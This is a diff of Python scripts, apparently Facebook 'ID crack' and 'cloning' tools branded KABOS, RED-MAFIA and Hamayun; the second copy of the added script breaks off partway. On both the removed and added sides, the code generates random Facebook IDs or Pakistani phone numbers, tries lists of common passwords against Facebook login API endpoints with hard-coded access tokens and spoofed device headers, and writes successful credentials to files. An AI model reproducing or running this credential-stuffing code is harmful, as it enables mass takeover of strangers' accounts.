@@ -1,259 +1,727 @@
-#----------------------------[IMPORT/MODULE]-----------------------------------#
-import os
-import random
-import sys
-import subprocess
-import time, uuid
-from io import BytesIO
+#!/usr/bin/python2
+#coding=utf-8
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
+os.system('rm -rf .txt')
+for n in range(10000):
+
+    nmbr = random.randint(1111111, 9999999)
+
+    sys.stdout = open('.txt', 'a')
+
+    print(nmbr)
+
+    sys.stdout.flush()
 
 try:
     import requests
-except ModuleNotFoundError:
-    os.system("pip install requests")
+except ImportError:
+    os.system('pip2 install mechanize')
 
 try:
-    import pycurl
-except ModuleNotFoundError:
-    os.system("pip install pycurl")
+    import mechanize
+except ImportError:
+    os.system('pip2 install request')
+    time.sleep(1)
+    os.system('Then type:python2 MAFIA-143.py')
 
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
-#-----------------------------[LINE]-----------------------------------#
-def lin():
-    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-#-----------------------------[COLOR CODE]-----------------------------------#
-r = "\x1b[1;31m"
-g = "\x1b[1;32m"
-b = "\x1b[1;34m"
-p = "\x1b[1;35m"
-m = "\x1b[1;36m"
-w = "\x1b[1;37m"
-loop = 0
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+
+
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def keluar():
+        print 'Thanks.'
+        os.sys.exit()
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!'+w[random.randint(0,len(w)-1)]+i
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
+    x += '\033[0m'
+    x = x.replace('!0','\033[0m')
+    sys.stdout.write(x+'\n')
+
+
+def jalan(z):
+        for e in z + '\n':
+                sys.stdout.write(e)
+                sys.stdout.flush()
+                time.sleep(00000.1)
+def tik():
+        titik = ['.   ','..  ','... ']
+        for o in titik:
+                print("\r\x1b[1;93mRED-MAFIA–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+
+
+back = 0
 oks = []
-cps = []
-ugen = []
-rr=random.randint
-rc=random.choice
-#----------------------------[USER/AGENT]-----------------------------------#
-def windows():
-    best_build = random.randint(6000, 9000)
-    patch = random.randint(100, 200)
-    return (f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) "
-            f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{best_build}.{patch} Safari/537.36")
-#----------------------------[LOGO]-----------------------------------#
-logo = f"""{g}
-                                                  
-                                                  
-                                                  
- ##   ###    :##:    ######:    .####.    :####:  
- ##   ##      ##     #######    ######   :######  
- ## :##:     ####    ##   :##  :##  ##:  ##:  :#  
- ##.##:      ####    ##    ##  ##:  :##  ##       
- #####      :#  #:   ##   :##  ##    ##  ###:     
- #####       #::#    #######.  ##    ##  :#####:  
- #####:     ##  ##   #######.  ##    ##   .#####: 
- ##::##     ######   ##   :##  ##    ##      :### 
- ##  ##    .######.  ##    ##  ##:  :##        ## 
- ##  :##   :##  ##:  ##   :##  :##  ##:  #:.  :## 
- ##   ##   ###  ###  ########   ######   #######: 
- ##   :##  ##:  :##  ######     .####.   .#####:                                                                                                                                                                                                                                                                                                                                                     
-     ###    .####.       ###                      
-    :###    ######      :###                      
-   .####   :##  ##:    .####                      
-   ##.##   ##:  :##    ##.##                      
-  :#: ##   ##    ##   :#: ##                      
- .##  ##   ## ## ##  .##  ##                      
- ##   ##   ## ## ##  ##   ##                      
- ########  ##    ##  ########                     
- ########  ##:  :##  ########                     
-      ##   :##  ##:       ##                      
-      ##    ######        ##                      
-      ##    .####.        ##                      
-                                                  
-                                                  
-                                                  
-                                                         
-                                        
-{p}━═━═══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━━══━═━═━═━═━══{w}
-TOOL OWNER    {r}:{w} FOUNDER
-TOOL TYPE     {r}:{w} 2008-2015 ID CRACK {r}[{g}V1.0{r}]
-TOOL STATUS   {r}:{w} \x1b[0;45mPREMIUM\x1b[0;91m{w}
-YOUR KEY      {r}:{g} PRIVATE
-SOURCE  BY    {r}:{g} KABOS STORE
-{p}━═━═══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━═━═━══━═━═━══━═━═"""
-#----------------------------[MAIN/DEF]-----------------------------------#
-def main():
-    user = []
-    os.system("clear")
-    print(logo)
-    print(f'{g}<{r}/{g}>{w} EXAMPLE   {r}: {w}10000 {g}| {w}20000 {g}| {w}90000')
-    lin()    
-    limit = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
-    lin()    
-    print(f"{g}[{r}1{g}] {w}SERVER {r}~ {g}[{w}2008{r}-{w}2009{g}]")
-    print(f"{g}[{r}2{g}] {w}SERVER {r}~ {g}[{w}2010{r}-{w}2015{g}]")
-    lin()   
-    ask = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
-    lin()   
-    print(f"{g}[{r}1{g}] {w}SERVER {r}[{g}V2{r}]")
-    print(f"{g}[{r}2{g}] {w}SERVER {r}[{g}V1{r}]{g}")
-    lin() 
-    mtd_opt = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
-    lin()    
-    print(f"{g}[{r}1{g}] {w} CRACK SPEED {r}[{g}HIGH{r}]")
-    print(f"{g}[{r}2{g}] {w} CRACK SPEED {r}[{g}NORMAL{r}]{g}")
-    lin()    
-    cspd = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")    
-    if "1" in cspd:
-        speedx = 45
-    else:
-        speedx = 30        
-    if ask in ["1","02"]:
-        sv = f"{g}[{w}2008{r}-{w}2009{g}]"
-        for i in range(int(limit)):
-            data = "1000000"+str(random.choice(range(11111111, 99999999)))
-            user.append(data)
-    elif ask in ["2", "02"]:
-        sv = f"{g}[{w}2010{r}-{w}2015{g}]"
-        for i in range(int(limit)):
-            data = rc(["100001","100002","100003"])+str(random.choice(range(111111111, 999999999)))
-            user.append(data)
-    else:
-        sv = f"{g}[{w}2008{r}-{w}2010{g}]"
-        for i in range(int(limit)):
-            data = random.choice(["10000001", "10000000"]) + str(random.choice(range(1111111, 9999999)))
-            user.append(data)
-    with ThreadPool(max_workers=speedx) as samira:
-        tl = str(limit)
-        os.system('clear')
-        print(logo)
-        print(f'{g}[{r}~{g}] {w}TOTAL ID {r}: {p}{limit} {g}[{r}~{g}] {w}SERVER {r}: {sv}')
-        print(f'{g}[{r}~{g}] {w}IF NO RESULT {g}[{w}ON{r}/{w}OFF{g}]{w} AIRPLANE MODE{g}')
-        lin()
-        for mal in user:
-            uid = mal
-            if mtd_opt in ["1", "A"]:
-                samira.submit(login1, uid, tl)
-            elif mtd_opt in ["2", "B"]:
-                samira.submit(login1, uid, tl)
-            else:
-                samira.submit(login2, uid, tl)
-    print("")
-    lin()
-    print(f"{g}[{r}~{g}] {w}CRACK PROCESSED COMPLETED")
-    print(f"{g}[{r}~{g}] {w}TOTAL OK ID : {g}{str(len(oks))}")
-    lin()
-    input(f"{g}[{r}~{g}] {w}PRESS ENTER TO EXIT")
-    sys.exit()
+id = []
+cpb = []
+vulnot = "\033[31mNot Vuln"
+vuln = "\033[32mVuln"
 
-def login1(uid, tl):
-    global loop,oks,cps
-    session = requests.session()    
-    try:
-        sys.stdout.write(f"\r➤ {g}{uid}{r}-{g}ID {r}[{g}{loop}{r}/{w}{tl}{r}] [{g}HIT{r}/{g}{len(oks)}{r}]")
-        sys.stdout.flush()        
-        ua = windows()
-        for pw in ('123456', '1234567', 'qwerty', 'password', '123123', '12341234', '12345678', '123456789', 'love you', 'facebook'):
-            data = {
-                'adid': str(uuid.uuid4()),
-                'format': 'json',
-                'device_id': str(uuid.uuid4()),
-                'cpl': 'true',
-                'family_device_id': str(uuid.uuid4()),
-                'credentials_type': 'device_based_login_password',
-                'error_detail_type': 'button_with_disabled',
-                'source': 'device_based_login',
-                'email': str(uid),
-                'password': str(pw),
-                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                'generate_session_cookies': '1',
-                'meta_inf_fbmeta': '',
-                'advertiser_id': str(uuid.uuid4()),
-                'currently_logged_in_userid': '0',
-                'locale': 'en_US',
-                'client_country_code': 'US',
-                'method': 'auth.login',
-                'fb_api_req_friendly_name': 'authenticate',
-                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-                'api_key': '882a8490361da98702bf97a021ddc14d'
-            }
-            headers = {
-                'User-Agent': ua,
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Host': 'graph.facebook.com',
-                'X-FB-Net-HNI': '25227',
-                'X-FB-SIM-HNI': '29752',
-                'X-FB-Connection-Type': 'MOBILE.LTE',
-                'X-Tigon-Is-Retry': 'False',
-                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
-                'x-fb-device-group': '5120',
-                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                'X-FB-Request-Analytics-Tags': 'graphservice',
-                'X-FB-HTTP-Engine': 'Liger',
-                'X-FB-Client-IP': 'True',
-                'X-FB-Server-Cluster': 'True',
-                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
-            }
-            res = session.post('https://b-graph.facebook.com/auth/login',data=data,headers=headers,allow_redirects=False).json()
-            if 'session_key' in res:
-                cookie = ";".join(i["name"] + "=" + i["value"] for i in res["session_cookies"])
-                print(f"\r\r{g}SUCCESS {p}➤ {w}{uid} {r}|{w} {pw}")
-                print(f"\r\r{g}{cookie}")
-                open('/sdcard/2009-2015-KABOS.txt', 'a').write(f"{uid}|{pw}\n")
-                oks.append(uid)
-                break           
-            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r{r}FAILED {p}➤ {w}{uid} {r}|{w} {pw}")
-                open('/sdcard/2009-2015-CP.txt', 'a').write(f"{uid}|{pw}\n")
-                cps.append(uid)
-                break          
-            else:
-                continue
-        loop += 1
-    except Exception:
-        time.sleep(5)
+os.system("clear")
+print  """
 
-#----------------------------[METHOD 1]-----------------------------------#
-def login2(uid, tl):
-    global oks, cpe,  loop
-    try:
-        sys.stdout.write(f"\r➤ {g}JSON{r}-{g}XD {r}[{g}{loop}{r}/{w}{tl}{r}] [{g}OK{r}/{g}{len(oks)}{r}]")
-        sys.stdout.flush()
-        for pw in ["123456", "1234567", "12345678", "123456789", "123123", "000000", "asdfgh", "qwerty", "112233", "987654321"]:
-            headers = {
-                'x-fb-connection-bandwidth': str(random.randint(20000000, 40000000)),
-                'x-fb-sim-hni': str(random.randint(20000, 40000)),
-                'x-fb-net-hni': str(random.randint(20000, 40000)),
-                'x-fb-connection-quality': 'EXCELLENT',
-                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
-                'user-agent': window1(),
-                'content-type': 'application/x-www-form-urlencoded',
-                'x-fb-http-engine': 'Liger'
-            }
-            url = ('https://b-api.facebook.com/method/auth.login?format=json&email=' +
-                   str(uid) + '&password=' + str(pw) + 
-                   '&credentials_type=device_based_login_password&generate_session_cookies=1' +
-                   '&error_detail_type=button_with_disabled&source=device_based_login' +
-                   '&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US' +
-                   '&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.' +
-                   'HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32' +
-                   '&fb_api_req_friendly_name=authenticate&cpl=true')
-            rp = requests.get(url, headers=headers).json()
-            if "session_key" in rp:
-                print(f"\r\r{g}SUCCESS {p}➤ {w}{uid} {r}|{w} {pw}")
-                open("/sdcard/OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
-                oks.append(uid)
-                break 
-            elif "Please Confirm Email" in str(rp):
-                print(f"\r\r{g}SUCCESS {p}➤ {g}{uid} {r}|{g} {pw}")
-                open("/sdcard/OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
-                oks.append(uid)
-                break
+██████╗     ██╗  ██╗
+██╔══██╗    ██║ ██╔╝
+██████╔╝    █████╔╝ 
+██╔══██╗    ██╔═██╗ 
+██║  ██║    ██║  ██╗
+╚═╝  ╚═╝    ╚═╝  ╚═╝
+██████╗ ███████╗██████╗ 
+██╔══██╗██╔════╝██╔══██╗
+██████╔╝█████╗  ██║  ██║
+██╔══██╗██╔══╝  ██║  ██║
+██║  ██║███████╗██████╔╝
+╚═╝  ╚═╝╚══════╝╚═════╝               
+
+███╗   ███╗ █████╗ ███████╗██╗ █████╗ 
+████╗ ████║██╔══██╗██╔════╝██║██╔══██╗
+██╔████╔██║███████║█████╗  ██║███████║
+██║╚██╔╝██║██╔══██║██╔══╝  ██║██╔══██║
+██║ ╚═╝ ██║██║  ██║██║     ██║██║  ██║
+╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝
+ \033[1;96m          WHATSAPP NO 03188214452
+"""
+
+####Logo####
+
+logo1 = """
+
+██████╗ ███████╗██████╗ 
+██╔══██╗██╔════╝██╔══██╗
+██████╔╝█████╗  ██║  ██║
+██╔══██╗██╔══╝  ██║  ██║
+██║  ██║███████╗██████╔╝
+╚═╝  ╚═╝╚══════╝╚═════╝ 
+                        
+███╗   ███╗ █████╗ ███████╗██╗ █████╗ 
+████╗ ████║██╔══██╗██╔════╝██║██╔══██╗
+██╔████╔██║███████║█████╗  ██║███████║
+██║╚██╔╝██║██╔══██║██╔══╝  ██║██╔══██║
+██║ ╚═╝ ██║██║  ██║██║     ██║██║  ██║
+╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝
+\033[1;97m                                   ''''''''''!!!!!!!!!!!!!!
+"""
+logo2 = """
+\033[1;91m                    ,.
+\033[1;92m                  ,_> `.   ,';
+\033[1;93m              ,-`'      `'   '`'._
+\033[1;94m           ,,-) ---._   |   .---''`-),.
+\033[1;95m         ,'      `.  \  ;  /   _,'     `,
+\033[1;96m      ,--' ____       \   '  ,'    ___  `-,
+\033[1;97m     _>   /--. `-.              .-'.--\   \__
+\033[1;97m    '-,  (    `.  `.,`~ \~'-. ,' ,'    )    _\
+\033[1;96m    _<    \     \ ,'  ') )   `. /     /    <,.
+\033[1;95m ,-'   _,  \    ,'    ( /      `.    /        `-,
+\033[1;94m `-.,-'     `.,'       `         `.,'  `\    ,-'
+\033[1;93m  ,'       _  /   ,,,      ,,,     \     `-. `-._
+\033[1;92m /-,     ,'  ;   ' _ \    / _ `     ; `.     `(`-\
+\033[1;91m  /-,        ;    (o)      (o)      ;          `'`,
+\033[1;91m,~-'  ,-'    \     '        `      /     \      <_
+\033[1;92m/-. ,'        \                   /       \     ,-'
+\033[1;93m  '`,     ,'   `-/             \-' `.      `-. <
+\033[1;94m   /_    /      /   (_     _)   \    \          `,
+\033[1;95m     `-._;  ,' |  .::.`-.-' :..  |       `-.    _\
+\033[1;96m       _/       \  `:: ,^. :.:' / `.        \,-'
+\033[1;97m     '`.   ,-'  /`-..-'-.-`-..-'\            `-.
+\033[1;97m       >_ /     ;  (\/( ' )\/)  ;     `-.    _<
+\033[1;96m       ,-'      `.  \`-^^^-'/  ,'        \ _<
+\033[1;95m        `-,  ,'   `. `     ,'   `-.   <`'
+\033[1;94m          ')        `._.,,_.'        \ ,-'
+\033[1;93m           '._        '`'`'   \       <
+\033[1;92m              >   ,'       ,   `-.   <`'
+"""
+Username = "RK"
+CorrectPasscode = "RK"
+
+loop = 'true'
+while (loop == 'true'):
+    passcode = raw_input("\033[1;92m[?] \x1b[1;91mPASSWORD \x1b[1;95m: ")
+    if (passcode == CorrectPasscode):
+            print """
+            \033[1;92mWelcome to All friend
+                  """
+            loop = 'false'
+    else:
+            print "\033[1;91mâ˜ ï¸�WRONG"
+            os.system('xdg-open https://wa.me/+923188214452')
+
+##### LICENSE #####
+#=================#
+def lisensi():
+    os.system('clear')
+    login()
+####login#########
+def login():
+    os.system('clear')
+    print logo1
+    print "\033[1;96m[1]\x1b[1;93mStart cloning ( no login )"
+    time.sleep(0.05)
+    print '\x1b[1;95m[0]\033[1;92m Exit (Coming Soon)'
+    pilih_login()
+
+def pilih_login():
+    peak = raw_input("\n\033[1;93mCHOOSE: \033[1;91m")
+    if peak =="":
+        print "\x1b[1;95mFill In Correctly"
+        pilih_login()
+    elif peak =="1":
+        Zeek()
+def Zeek():
+    os.system('clear')
+    print logo1
+    print '\x1b[1;91m[1]  Start Cracking'
+    time.sleep(0.05)
+    print '\x1b[1;92m[0] \033[1;93m Back'
+    time.sleep(0.05)
+    action()
+
+def action():
+    peak = raw_input('\n\033[1;95mCHOOSE:\033[1;97m')
+    if peak =='':
+        print '[!] Fill In Correctly'
+        action()
+    elif peak =="1":              
+        os.system("clear")
+        print logo2
+        print "Enter any Pakistani Mobile code Number"+'\n'
+        print ' Enter any code 1 to 49'
+        try:
+            c = raw_input("\033[1;96mCHOOSE : ")
+            k="03"
+            idlist = ('.txt')
+            for line in open(idlist,"r").readlines():
+                id.append(line.strip())
+        except IOError:
+            print ("[!] File Not Found")
+            raw_input("\n[ Back ]")
+            blackmafiax()
+    elif peak =='0':
+        login()
+    else:
+        print '[!] Fill In Correctly'
+        action()
+    print 50* '\033[1;91m-'
+    xxx = str(len(id))
+    jalan ('\033[1;91m Total ids number: '+xxx)
+    jalan ('\033[1;93mCode you choose: '+c)
+    jalan ("\033[1;95mTotal 5 password will clone ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â 11 digit , last 7 digit, pakistan, 000786, 786786 password Start Cracking...")
+    jalan ("\033[1;96mTo Stop Process Press Ctrl+z")
+    print 50* '\033[1;92m-'
+    def main(arg):
+        global cpb,oks
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;91m(just-now-OK)  ' + k + c + user + '  |  ' + pass1                                       
+                okb = open('save/cloned.txt', 'a')
+                okb.write(k+c+user+pass1+'\n')
+                okb.close()
+                oks.append(c+user+pass1)
             else:
-                continue
-        loop += 1
-    except requests.exceptions.ConnectionError:
-        time.sleep(30)
-    except Exception as e:
-        pass
-main()
-#----------------------------[CODE/END]-----------------------------------#
+                if 'www.facebook.com' in q['error_msg']:
+                    print '\033[1;91m(just-now-CP) ' + k + c + user + '  |  ' + pass1
+                    cps = open('save/cloned.txt', 'a')
+                    cps.write(k+c+user+pass1+'\n')
+                    cps.close()
+                    cpb.append(c+user+pass1)
+                else:
+                    pass2 = k + c + user
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;93m(just-now-OK)  ' + k + c + user +  '  |  ' + pass2
+                        okb = open('save/cloned.txt', 'a')
+                        okb.write(k+c+user+pass2+'\n')
+                        okb.close()
+                        oks.append(c+user+pass2)
+                    else:
+                        if 'www.facebook.com' in q['error_msg']:
+                            print '\033[1;93m(just-now-CP) ' + k + c + user + '  |  ' + pass2
+                            cps = open('save/cloned.txt', 'a')
+                            cps.write(k+c+user+pass2+'\n')
+                            cps.close()
+                            cpb.append(c+user+pass2)
+                        else:
+                            pass3="000786"
+                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                            q = json.load(data)
+                            if 'access_token' in q:
+                                print '\x1b[1;95m(just-now-OK)  ' + k + c + user + '  |  ' + pass3
+                                okb = open('save/cloned.txt', 'a')
+                                okb.write(k+c+user+pass3+'\n')
+                                okb.close()
+                                oks.append(c+user+pass3)
+                            else:
+                                if 'www.facebook.com' in q['error_msg']:
+                                    print '\033[1;95m(just-now-CP) ' + k + c + user + '  |  ' + pass3 
+                                    cps = open('save/cloned.txt', 'a')
+                                    cps.write(k+c+user+pass3+'\n')
+                                    cps.close()
+                                    cpb.append(c+user+pass3)
+                                else:
+                                    pass4="Pakistan"
+                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                    q = json.load(data)
+                                    if 'access_token' in q:
+                                        print '\x1b[1;96m(just-now-OK)  ' + k + c + user + '  |  ' + pass4 
+                                        okb = open('save/cloned.txt', 'a')
+                                        okb.write(k+c+user+pass4+'\n')
+                                        okb.close()
+                                        oks.append(c+user+pass4)
+                                    else:
+                                        if 'www.facebook.com' in q['error_msg']:
+                                            print '\033[1;96m(just-now-CP) ' + k + c + user + '  |  ' + pass4
+                                            cps = open('save/cloned.txt', 'a')
+                                            cps.write(k+c+user+pass4+'\n')
+                                            cps.close()
+                                            cpb.append(c+user+pass4)
+                                        else:
+                                            pass5="786786"
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            q = json.load(data)
+                                            if 'access_token' in q:
+                                                print '\x1b[1;94m(just-now-OK)  ' + k + c + user + '  |  ' + pass5
+                                                okb = open('save/cloned.txt', 'a')
+                                                okb.write(k+c+user+pass5+'\n')
+                                                okb.close()
+                                                oks.append(c+user+pass5)
+                                            else:
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print '\033[1;94m(just-now-CP) ' + k + c + user + '  |  ' + pass5 
+                                                    cps = open('save/cloned.txt', 'a')
+                                                    cps.write(k+c+user+pass5+'\n')
+                                                    cps.close()
+                                                    cpb.append(c+user+pass5)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 50* '\033[1;91m-'
+    print 'Hamayun Process Has Been Completedâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’...100%'
+    print 'Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
+    print('Hamayun Cloned Accounts Has Been Saved : save/cloned.txt')
+    jalan("Note : Your (CP)Accounts Open after 5 to 8 days")
+    print ''
+    print """
+    
+    
+    
+    
+\033[1;91mThanks \033[1;97mUsing My Tool
+"""
+
+
+    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
+    login() 
+
+if __name__ == '__main__':
+    login()
+
+
+
+#!/usr/bin/python2
+#coding=utf-8
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
+os.system('rm -rf .txt')
+for n in range(10000):
+
+    nmbr = random.randint(1111111, 9999999)
+
+    sys.stdout = open('.txt', 'a')
+
+    print(nmbr)
+
+    sys.stdout.flush()
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install mechanize')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install request')
+    time.sleep(1)
+    os.system('Then type: python2 Happy.py')
+
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+
+
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def keluar():
+        print 'Thanks.'
+        os.sys.exit()
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!'+w[random.randint(0,len(w)-1)]+i
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
+    x += '\033[0m'
+    x = x.replace('!0','\033[0m')
+    sys.stdout.write(x+'\n')
+
+
+def jalan(z):
+        for e in z + '\n':
+                sys.stdout.write(e)
+                sys.stdout.flush()
+                time.sleep(00000.1)
+def tik():
+        titik = ['.   ','..  ','... ']
+        for o in titik:
+                print("\r\x1b[1;93mHamayunâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+
+
+back = 0
+oks = []
+id = []
+cpb = []
+vulnot = "\033[31mNot Vuln"
+vuln = "\033[32mVuln"
+
+os.system("clear")
+print  """
+____🌹🌸 🌾 💙▫⬜▫💙 🌾 🌸🌹
+__🌾🌾💜💙☆💙::::::::💙☆💙💜🌾🌾
+_🌹🌸💜💙___☆💙::💙☆.__💙💜🌸🌹
+🌾🌾💜💙▫▫ ☆💙☆▫.💙💜🌾🌾
+🌹🌸💜💙Always be Happy 
+🌾🌾💜💙Have a Nice Time
+_🌹🌸💜💙Take Care Dear 
+__🌾🌾💜💙All Friends 
+____🌹🌸💜💙
+_____🌾🌾💜💙
+_______🌹🌸💜💙
+_________🌾🌾💜💙
+___________🌹🌸💜💙
+_____________🌾🌾💜💙
+_______________🌹🌸💜💙
+🌹🌹🌹🌹🌹🌹.🌹🌹💜💙
+🌸🌸🌸🌸🌸🌸🌸🌸🌸💜💙
+💜💜💜💜💜💜💜💜💜💜💜💙
+💙💙💙💙💙💙💙💙💙💙💙💙💙
+ 
+ \033[1;96m          WHATSAPP NO +9231234567890
+"""
+
+####Logo####
+
+logo1 = """
+\033[1;91m            _      _
+\033[1;92m           (c\-.--/a)
+\033[1;93m            |q: p   /\_            _____
+\033[1;94m          __\(_/  ).'  '---._.---'`     '---.__
+\033[1;95m         /  (Y_)_/             /        : \-._ \
+\033[1;96m !!!!,,, \_))'-';             (       _/   \  '\\_
+\033[1;97m!!II!!!!!IIII,, \_             \     /      \_  '.\
+\033[1;91m !IIsndIIIII!!!!,,\     /_      \   |----.___ '-. \'.__
+\033[1;92m !!!IIIIIIIIIIIIIIII\   | '--._.-'  _)       \  |  `'--'
+\033[1;93m     '''!!!!IIIIIII/   .',, ((___.-'         / /
+\033[1;94m           '''!!!!/  _/!!!!IIIIIII!!!!!,,,,,;,;,,,.....
+\033[1;95m                 | /IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+\033[1;96m                 | \   ''IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+\033[1;97m                 \_,)     '''''!!!!IIIIIIIIIIIIIIII!!!!!!!!
+\033[1;97m                                   ''''''''''!!!!!!!!!!!!!!
+"""
+logo2 = """
+\033[1;91m                    ,.
+\033[1;92m                  ,_> `.   ,';
+\033[1;93m              ,-`'      `'   '`'._
+\033[1;94m           ,,-) ---._   |   .---''`-),.
+\033[1;95m         ,'      `.  \  ;  /   _,'     `,
+\033[1;96m      ,--' ____       \   '  ,'    ___  `-,
+\033[1;97m     _>   /--. `-.              .-'.--\   \__
+\033[1;97m    '-,  (    `.  `.,`~ \~'-. ,' ,'    )    _\
+\033[1;96m    _<    \     \ ,'  ') )   `. /     /    <,.
